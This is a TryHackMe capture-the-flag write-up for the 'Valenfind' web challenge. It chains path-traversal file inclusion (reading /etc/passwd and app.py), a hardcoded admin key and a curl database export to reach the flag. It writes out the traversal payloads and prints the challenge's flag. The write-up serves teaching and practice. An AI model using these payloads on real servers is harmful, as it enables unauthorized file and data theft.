# Valenfind — TryHackMe Writeup

**Difficulty:** Medium
**Category:** Web
**Vulnerabilities:** Local File Inclusion (LFI), Hardcoded API Key, Sensitive Data Exposure

---

## Overview

Valenfind is a dating web application described as "vibe-coded" — built quickly with AI assistance and lacking proper security controls. The challenge involves chaining multiple vulnerabilities to extract the flag from the application's database.

---

## Reconnaissance

### Application Structure

After registering an account and logging in, the dashboard displayed user profiles. Navigating to a profile revealed clean URL routing:

```
http://<TARGET_IP>:5000/profile/romeo_montague
```

### Intercepting Requests with Burp Suite

While changing the profile theme, Burp Suite captured an interesting request:

```
GET /api/fetch_layout?layout=theme_modern.html HTTP/1.1
```

The `layout` parameter loads a file by name from the server — a potential LFI entry point.

---

## Exploitation

### Step 1 — Confirming LFI

```
GET /api/fetch_layout?layout=../../../../etc/passwd HTTP/1.1
```

The server returned `/etc/passwd`, confirming LFI. The error messages also revealed the application's base path:

```
/opt/Valenfind/templates/components/
```

### Step 2 — Reading the Source Code

Using the base path to navigate up two directories:

```
GET /api/fetch_layout?layout=../../app.py HTTP/1.1
```

The full Flask application source code was returned, revealing two critical pieces of information:

**1. A hardcoded admin API key:**
```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
```

**2. A protected admin route:**
```python
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    if auth_header == ADMIN_API_KEY:
        return send_file(DATABASE, as_attachment=True)
```

### Step 3 — Downloading the Database

```bash
curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
  http://<TARGET_IP>:5000/api/admin/export_db -o cupid.db
```

### Step 4 — Extracting the Flag

```bash
sqlite3 cupid.db "SELECT * FROM users;"
```

The admin user's record contained the flag in the `address` field:

```
cupid|admin_root_x99|...|FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}|...
```

---

## Key Takeaways

- **LFI in API parameters** is easily overlooked but can lead to full source code disclosure.
- **Hardcoded secrets** in source code are immediately exploitable once the code is exposed.
- **Passwords stored in plaintext** in the database compound the damage of any data breach.
- "Vibe-coding" (AI-assisted rapid development) can produce functional apps with deeply insecure patterns if not reviewed carefully.

---

## Vulnerability Chain

```
LFI → Source Code Disclosure → Hardcoded API Key → Database Export → Flag
```

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|--------------|----------|--------|
| LFI | `?layout=` parameter | Arbitrary file read |
| Hardcoded API Key | `app.py` | Unauthorized admin access |
| Plaintext passwords | `cupid.db` | Full credential exposure |
| Sensitive data in DB | `users` table | Flag and PII exposure |
